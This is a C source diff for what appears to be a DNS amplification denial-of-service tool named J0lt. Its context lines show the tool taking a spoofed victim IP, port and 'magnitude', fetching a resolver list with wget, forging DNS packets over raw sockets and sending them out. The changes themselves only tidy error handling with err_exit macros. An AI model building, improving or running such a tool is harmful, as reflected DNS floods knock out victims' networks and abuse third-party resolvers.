@@ -159,6 +159,13 @@ DEFINE_INSERT_FN(dword, uint32_t)
 DEFINE_INSERT_FN(qword, uint64_t)
 #undef DEFINE_INSERT_FN
 
+#define     err_exit(msg) do {  perror(msg); \
+                                exit(EXIT_FAILURE); \
+                                } while (0)
+
+#define     fork_err_exit(msg) do { perror(msg); \
+                                    _exit(EXIT_FAILURE); \
+                                    } while (0)
 // IP HEADER VALUES
 #define     IP_IHL_MIN_J0LT 5
 #define     IP_IHL_MAX_J0LT 15
@@ -236,27 +243,23 @@ main(int argc, char** argv)
 
     printf("%s", g_ansi);
     if (argc != 4)
-        goto fail_state;
+        err_exit("* incorrect argc");
 
     spoofip = inet_addr(argv[ 1 ]);
     if (spoofip == 0)
-        goto fail_state;
+        err_exit("* invalid spoof ip");
 
     errno = 0;
     spoofport = ( uint16_t ) strtol(argv[ 2 ], NULL, 0);
     magnitude = ( uint16_t ) strtol(argv[ 3 ], NULL, 0);
     if (errno != 0)
-        goto fail_state;
+        err_exit("* spoof port or mgnituted incorrect");
 
-    if ((pid = fork( )) < 0) {
-        printf("* forking child process failed\n");
-        _exit(EXIT_FAILURE);
-    }
+    if ((pid = fork( )) < 0)
+        fork_err_exit("* forking child process failed\n");
     else if (pid == 0) {
-        if (execv(*g_wget, g_wget) < 0) {
-            printf("* exec failed\n");
-            _exit(EXIT_FAILURE);
-        }
+        if (execv(*g_wget, g_wget) < 0)
+            fork_err_exit("* exec failed");
     }
     else {
         while (wait(&status) != pid)
@@ -265,7 +268,7 @@ main(int argc, char** argv)
 
     fptr = fopen(g_path, "r");
     if (fptr == NULL)
-        goto fail_state;
+        err_exit("* fopen error");
 
     printf("+ resolv list saved to %s\n", g_path);
     while (magnitude >= 1) {
@@ -298,9 +301,6 @@ main(int argc, char** argv)
     printf("- resolv list removed from %s\n", g_path);
 
     return 0;
-fail_state:
-    perror("error");
-    exit(EXIT_FAILURE);
 }
 
 
@@ -342,6 +342,7 @@ ForgeJ0ltPacket(char* payload, uint32_t resolvip, uint32_t spoofip, uint16_t spo
 
     return nwritten;
 }
+
 
 bool
 InsertDNSHeader(uint8_t** buf, size_t* buflen)
@@ -502,8 +503,7 @@ SendPayload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t n
     if (raw_sockfd == -1) {
         remove(g_path);
         printf("- resolv list removed from %s\n", g_path);
-        perror("* fatal socket error");
-        exit(EXIT_FAILURE);
+        err_exit("* fatal socket error");
     }
 
     addr.sin_family = AF_INET;
